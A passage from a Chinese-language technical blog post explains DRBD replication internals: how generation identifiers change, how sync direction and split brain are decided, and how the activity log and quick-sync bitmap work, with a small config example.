<h3 id="GI如何变化"><a href="#GI如何变化" class="headerlink" title="GI如何变化"></a>GI如何变化</h3><h4 id="Start-of-a-new-data-generation"><a href="#Start-of-a-new-data-generation" class="headerlink" title="Start of a new data generation"></a>Start of a new data generation</h4><p><img src="/images/drbd/gi-changes-newgen.png" alt="gi-changes-newgen.png"></p>
<p>当一个节点（无论是由于网络故障还是手动干预）失去与其对等节点的连接时，DRBD 以下方式修改其本地生成GI：</p>
<ol>
<li>为新的数据生成创建一个新的 UUID。这成为主节点的新的 current UUID。</li>
<li>用之前的current UUID替换现在的Bitmap UUID，因此它成为主节点的新的Bitmap UUID。</li>
<li>在次要节点上，GI元组保持不变</li>
</ol>
<h4 id="Start-of-re-synchronization"><a href="#Start-of-re-synchronization" class="headerlink" title="Start of re-synchronization"></a>Start of re-synchronization</h4><p><img src="/images/drbd/gi-changes-syncstart.png" alt="gi-changes-syncstart.png"></p>
<p>在重新同步初始化时，DRBD在本地GI执行这些修改：</p>
<ol>
<li>同步源上的Current UUID保持不变。</li>
<li>同步源上的Bitmap UUID轮换到第一个历史UUID。</li>
<li>在同步源上生成一个新的Bitmap UUID。</li>
<li>此UUID成为同步目标上的新Current UUID。</li>
<li>同步目标上的Bitmap UUID和历史UUID保持不变。</li>
</ol>
<h4 id="Completion-of-re-synchronization"><a href="#Completion-of-re-synchronization" class="headerlink" title="Completion of re-synchronization"></a>Completion of re-synchronization</h4><p><img src="/images/drbd/gi-changes-synccomplete.png" alt="gi-changes-synccomplete.png"></p>
<p>当重新同步完成，需要执行如下步骤：</p>
<ol>
<li>同步源上的Current UUID保持不变</li>
<li>同步源上的Bitmap UUID轮转到第一个历史UUID，第一历史UUID替换第二历史UUID（任何已存在的第二历史UUID将被丢弃）</li>
<li>同步源上的Bitmap UUID将被清空（清零）</li>
<li>同步目标采用来自同步源的整个GI元组</li>
</ol>
<h3 id="DRBD如何使用GI"><a href="#DRBD如何使用GI" class="headerlink" title="DRBD如何使用GI"></a>DRBD如何使用GI</h3><p>当两个节点之间建立连接时，它们会交换当前可用的生成标识符，并相应地进行操作。可能有许多可能的结果：</p>
<ul>
<li>两个节点的Current UUID都为空<br>  本地节点检测到它自己和对等节点的当前UUID都为空。这是刚刚配置好的资源的正常情况，尚未启动初始完全同步。不会进行同步，必须手动启动。</li>
<li>一个节点的Current UUID为空<br>  本地节点检测到对等节点的Current UUID为空，而自己的不为空。这是刚刚配置好的资源的正常情况，初始全同步刚刚启动，本地节点被选为初始同步源。DRBD现在设置磁盘上同步位图中的所有位（意味着它认为整个设备不同步），并作为同步源开始同步。在相反的情况下（本地Current UUID为空，对等节点不为空），DRBD执行相同的步骤，只是本地节点变成同步目标。</li>
<li>Current UUID相等<br>  本地节点检测到其Current UUID和对等节点的Current UUID都不为空且相等。这是在资源处于从属角色时进入断开连接模式的资源的正常情况，且在断开连接期间没有在任一节点上进行晋升。不会进行同步，因为不需要同步。</li>
<li>Bitmap UUID与对等节点的Current UUID匹配<br>  本地节点检测到它的Bitmap UUID与对等节点的Current UUID匹配，而对等节点的Bitmap UUID为空。这是从属节点故障后的正常预期情况，本地节点处于主角色。这意味着对等节点在此期间从未变为主节点，并一直使用相同的数据生成基础。现在，DRBD会启动正常的后台重新同步，本地节点成为同步源。反之，如果本地节点检测到它的Bitmap UUID为空，并且对等节点的位图与本地节点的Current UUID匹配，那么这是本地节点故障后的正常预期情况。同样，DRBD现在启动正常的后台重新同步，本地节点成为同步目标。</li>
<li>Current UUID与对等节点的历史UUID匹配<br>  本地节点检测到它的Current UUID与对等节点的历史UUID之一匹配。这意味着尽管两个数据集共享一个共同的祖先，并且对等节点具有最新的数据，但在对等节点的位图中保留的信息已经过时且无法使用。因此，正常同步是不足够的。DRBD现在将整个设备标记为不同步，并启动完全后台重新同步，本地节点成为同步目标。在相反的情况（本地节点的历史 UUID 与对等节点的Current UUID匹配），DRBD 执行相同的步骤，只是本地节点成为同步源。</li>
<li>Bitmap UUID匹配，但Current UUID不匹配<br>  本地节点检测到其Current UUID与对等节点的Current UUID不同，但Bitmap UUID匹配。这是脑裂的情况，但数据生成具有相同的父级。这意味着如果已配置，DRBD 将调用脑裂自动恢复策略。否则，DRBD将断开连接并等待手动脑裂解决。</li>
<li>Current UUID 和Bitmap UUID 都不匹配<br>  本地节点检测到其Current UUID与对等节点的Current UUID不同，且Bitmap UUID也不匹配。这是不相关祖先代的脑裂，因此即使配置了自动恢复策略，也是无用的。DRBD断开连接并等待手动脑裂解决。</li>
<li>没有 UUID 匹配<br>  如果DRBD未能在两个节点的GI元组中检测到任何匹配的元素，它会记录关于不相关数据的警告并断开连接。这是DRBD防止意外连接两个之前从未听说过对方的集群节点的安全保障。</li>
</ul>
<h2 id="Activity-Log"><a href="#Activity-Log" class="headerlink" title="Activity Log"></a>Activity Log</h2><p>在一个写操作期间，DRBD将写操作转发到本地后备块设备，但也通过网络发送数据块。这两个操作实际上都是同时进行的。随机的时序行为可能会导致这样一种情况：写操作已经完成，但网络传输尚未完成。如果此时活动节点失败并启动故障转移，则这个数据块在节点之间是不同步的——在崩溃之前已在失败的节点上写入，但复制尚未完成。因此，当节点最终恢复时，这个块必须在随后的同步期间从数据集中删除。否则，崩溃的节点将“领先于”存活的节点，这将违反复制存储的“全部或无”的原则。这不仅是DRBD所特有的问题，在实际上所有的复制存储配置中都存在这个问题。许多其他存储解决方案（就像DRBD本身在0.7版本之前）要求在活动节点失败后，该节点必须在恢复后进行完全同步。</p>
<p>DRBD自0.7版本之后。在元数据区域存储活动日志（Activity Log）跟踪了“最近”已经写入的那些块。俗称，这些区域被称为热区段。如果一个临时失败的处于活动模式的节点进行同步，只有在AL中突出显示的那些热区段需要进行同步，而不需要同步整个设备。这大大减少了在活动节点崩溃后进行同步所需的时间。</p>
<h3 id="Activity-extents"><a href="#Activity-extents" class="headerlink" title="Activity extents"></a>Activity extents</h3><p>Activity Log由多个Activity extents组成。可通过资源配置文件中的<code>activity-log-size</code>参数进行配置，该参数表示Active extents数量，必须是2的幂，且范围通常在16到4096之间。每个Activity extents大小为4MiB。</p>
<p>保持大的活动日志可以提高写入吞吐量。每次激活新的扩展时，一个旧的扩展将被重置为非活动状态。这种转换需要向元数据区域写入一个操作。如果活动扩展数很高，旧的活动扩展很少被交换出，从而减少了元数据写操作，从而提高了性能。</p>
<p>保持小的活动日志可以缩短在主节点失败和随后的恢复后的同步时间。</p>
<h3 id="选择一个合适Activity-Log-Size"><a href="#选择一个合适Activity-Log-Size" class="headerlink" title="选择一个合适Activity Log Size"></a>选择一个合适Activity Log Size</h3><p><img src="/images/drbd/al-extents.png" alt="al-extents.png"></p>
<ul>
<li><code>R</code>是同步速度（单位：MB&#x2F;s）</li>
<li><code>tsync</code>是同步时间（单位：s）</li>
<li><code>E</code>是Active extents数量</li>
</ul>
<p>DRBD是可以控制同步带宽的，使用<code>net</code>配置选项来控制DRBD在网络上使用的带宽。这个选项可以在DRBD配置文件中的全局段中设置，也可以在资源段中设置。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">global &#123;</span><br><span class="line">    ...</span><br><span class="line">    net &#123;</span><br><span class="line">        max-rate 1G;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>max-rate</code>选项将同步带宽限制为1Gbit&#x2F;s。您可以将该选项设置为所需的速率，以控制DRBD在网络上使用的带宽。</p>
<h2 id="Quick-sync-Bitmap"><a href="#Quick-sync-Bitmap" class="headerlink" title="Quick-sync Bitmap"></a>Quick-sync Bitmap</h2><p>Quick-sync Bitmap是 DRBD 在每个资源上使用的内部数据结构，用于跟踪块是否同步（在两个节点上相同）或不同步。它仅在资源处于断开模式时才相关。在Quick-sync Bitmap中，一个比特表示一个 4KiB 的磁盘数据块。如果该位被清除，则意味着相应的块仍与对等节点同步。这意味着该块自断开连接以来尚未被写入。相反，如果该位被设置，则意味着该块已被修改，并且在连接再次可用时需要重新同步。</p>
<p>当 DRBD 检测到断开的设备上的写 I&#x2F;O 时，因此开始在Quick-sync Bitmap中设置位，它在 RAM 中执行此操作，从而避免了昂贵的同步元数据 I&#x2F;O 操作。只有当相应的块变得“冷”（从活动日志中过期）时，DRBD 才会在Quick-sync Bitmap的磁盘表示中进行适当的修改。同样，如果在断开连接的同时手动关闭了剩余节点上的资源，则 DRBD 将完整的Quick-sync Bitmap刷新到持久存储中。当对等节点恢复或重新建立连接时，DRBD 将结合两个节点的位图信息，确定必须重新同步的总数据集。同时，DRBD 检查生成标识符以确定同步方向。</p>
<p>充当同步源的节点然后将协商好的块传输到对等节点，在同步目标确认修改时清除同步位。如果重新同步现在被中断（例如，由于另一个网络故障），然后继续恢复，它将在离开时继续进行 - 当然，同时修改的任何其他块都将添加到重新同步数据集中。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxprobe/p/5381538.html">一张图让你学会LVM</a></li>
<li><a target="_blank" rel="noopener" href="https://linbit.com/drbd-user-guide/users-guide-drbd-8-4/#ch-internals">linbit</a></li>
<li><a target="_blank" rel="noopener" href="https://chat.openai.com/">chatgpt</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">博</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">146</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">122</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">博</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


</body>
</html>
